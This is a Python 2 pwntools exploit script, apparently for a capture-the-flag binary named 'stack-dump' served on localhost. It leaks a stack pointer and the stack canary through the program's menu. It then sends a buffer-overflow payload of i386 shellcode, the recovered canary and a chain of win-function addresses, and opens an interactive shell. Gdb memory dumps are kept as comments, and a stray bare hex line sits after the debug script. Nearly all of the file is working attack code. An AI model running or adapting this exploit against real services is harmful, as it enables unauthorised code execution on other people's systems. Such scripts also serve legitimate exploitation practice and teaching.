#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./stack-dump --host localhost --port 6003
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./stack-dump')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 6003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x08048733
break *0x080488dd
break *0x080488e3
memory watch 0xffffcd78 0x10 byte
'''.format(**locals())
0x080488e9
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

'''
break *0x08048733
break *0x080488dd
break *0x080488e3
'''
def input_data(io,strLen, str):
	line = io.recvuntil('len:')
	print line
	io.sendline(strLen)
	io.sendline(str)

def runner(io, send):
	data = io.recvuntil('quit')
	print data
	if(send in ['a', 'b', 'c', 'd']):
		print 'Selected: '+send
		io.sendline(send)


def dump_memory(io):
	io.recvline()
	data = io.recvline()[len('memory at 0xffffcd03: '):]
	return data

io = start()

io.recvline()
pointerLine = io.recvline()
pointer = pointerLine[len('To make things easier, here\'s a useful stack pointer '):]
print 'Userfule Pointer: '+ pointer
pointer = p32(int(pointer,16) + 105)

runner(io, 'a')
input_data(io, '4', pointer)

io.recvuntil('quit')
runner(io, 'b')
canary = dump_memory(io)
print 'Possible Canary: '+canary
addressHexString_human = '\\x'.join(x.encode('hex') for x in canary)
print(addressHexString_human)

runner(io, 'a')


addressHexString = ''.join(x.encode('hex') for x in canary[::-1])
addressHexString_human = '\\x'.join(x.encode('hex') for x in canary)
print addressHexString_human
'''
clean
gefâž¤  x/12xw 0xffffcd13
0xffffcd13:	0x0000040a	0x00000000	0xffcd7b00	0x000000ff
0xffffcd23:	0x00000000	0x00000000	0x38a50000	0x00000983
0xffffcd33:	0xffcff200	0xdf54a9ff	0xfa0748f7	0xf9d000f7
0xffffcd43:	0xf9d000f7	0x000000f7	0x00000a00	0xf9d3fc08
0xffffcd53:	0x000000f7	0x04a00000	0x04894208	0x00000108
0xffffcd63:	0xffce2400	0xffce2cff	0xdf56a5ff	0xfe59b0f7
0xffffcd73:	0x000000f7	0x0488fb00	0x38a50008	0xf9d00083
'''
'''
overwrite
0xffffcd13:	0x0000630a	0xffcd7b00	0x616161ff	0x61616161
0xffffcd23:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcd33:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcd43:	0x61616161	0x61616161	0x61000a61	0x61616161
0xffffcd53:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcd63:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcd73:	0x61616161	0x61616161	0x38a50008	0xf9d00083

'''


#print('0x'+addressHexString[-8:])
address1 = int('0x'+addressHexString[-8:],16)
#print(address1)
#print '-> '+ str(len(p32(address1)))
#print p32(address1)
shellcode = asm(shellcraft.i386.linux.sh())
#payload = 'dfgh'+'a'*92

#payload += p32(address1)

#payload += 'a'*12+p32(0xffffcd1c)
winFun = p32(0x080486cd)
winChain = ''
for i in range(10):
	winChain += winFun
payload = fit({16:shellcode,96:p32(address1),100:winChain},filler='\x90',length=140)
print payload
input_data(io, str(len(payload)), payload)

io.recvuntil('quit')
runner(io, 'd')

io.interactive()
